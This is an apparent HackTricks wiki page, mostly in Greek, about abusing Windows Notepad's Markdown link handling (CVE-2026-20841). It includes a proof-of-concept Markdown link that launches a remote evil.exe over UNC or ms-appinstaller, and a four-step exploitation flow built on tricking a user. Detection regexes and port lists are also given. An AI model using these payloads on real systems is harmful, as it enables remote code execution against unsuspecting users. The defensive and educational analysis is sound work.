# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Οι εφαρμογές Windows που κάνουν render Markdown ή HTML ενδέχεται να παραδίδουν τους στόχους στους οποίους γίνεται κλικ στο `ShellExecuteExW`. Επειδή το ShellExecute dispatchάρει καταχωρισμένα URI schemes και file associations, ένας renderer χρειάζεται explicit allowlist αντί να θεωρεί ότι κάθε link είναι HTTP(S). Η συμπεριφορά του Notepad που περιγράφεται παρακάτω αφορά το CVE-2026-20841 και δεν πρέπει να γενικεύεται σε κάθε renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW surface στο Windows Notepad Markdown mode
- Το Notepad επιλέγει Markdown mode **μόνο για extensions `.md`** μέσω fixed string comparison στη `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Υποστηριζόμενα Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (γίνεται render ως `[target](target)`), επομένως και οι δύο syntaxes είναι σημαντικές για payloads και detections.
- Τα link clicks υποβάλλονται σε επεξεργασία στη `sub_140170F60()`, η οποία εκτελεί weak filtering και στη συνέχεια καλεί τη `ShellExecuteExW`.
- Η `ShellExecuteExW` κάνει dispatch σε **οποιοδήποτε configured protocol handler**, όχι μόνο σε HTTP(S).<sup>[[1]](#references)</sup>

### Payload considerations
- Όλες οι ακολουθίες `\\` στο link **normalizάρονται σε `\`** πριν από τη `ShellExecuteExW`, επηρεάζοντας το UNC/path crafting και το detection.
- Τα αρχεία `.md` **δεν συσχετίζονται με το Notepad από προεπιλογή**· το victim πρέπει και πάλι να ανοίξει το αρχείο στο Notepad και να κάνει click στο link, αλλά μετά το render το link είναι clickable.
- Επικίνδυνα example schemes:<sup>[[1]](#references)</sup>
- `file://` για την εκκίνηση local/UNC payload.
- `ms-appinstaller://` για την ενεργοποίηση App Installer flows. Άλλα locally registered schemes ενδέχεται επίσης να είναι abusable.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ροή exploitation
1. Δημιουργήστε ένα **`.md` αρχείο**, ώστε το Notepad να το αποδώσει ως Markdown.
2. Ενσωματώστε έναν σύνδεσμο χρησιμοποιώντας ένα επικίνδυνο URI scheme (`file:`, `ms-appinstaller:` ή οποιονδήποτε εγκατεστημένο handler).
3. Παραδώστε το αρχείο (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ή παρόμοιο) και πείστε τον χρήστη να το ανοίξει στο Notepad.
4. Με το κλικ, ο **normalized σύνδεσμος** παραδίδεται στο `ShellExecuteExW` και ο αντίστοιχος protocol handler εκτελεί το περιεχόμενο στο context του χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

## Ιδέες για detection
- Παρακολουθείτε transfers αρχείων `.md` μέσω ports/protocols που χρησιμοποιούνται συνήθως για την παράδοση εγγράφων: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Αναλύστε τους Markdown συνδέσμους (standard και autolink) και αναζητήστε **case-insensitive** `file:` ή `ms-appinstaller:`.
- Regexes με καθοδήγηση από vendors για τον εντοπισμό πρόσβασης σε remote resources:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Η επιδιόρθωση του vendor που περιγράφεται από το ZDI περιορίζει τους αποδεκτούς στόχους σε τοπικά αρχεία και HTTP(S). Επεκτείνετε τις detections και σε άλλους εγκατεστημένους protocol handlers, όπως απαιτείται, επειδή η καταχωρισμένη επιφάνεια επίθεσης διαφέρει ανά σύστημα.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Αυθαίρετη εκτέλεση κώδικα στο Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC για το CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
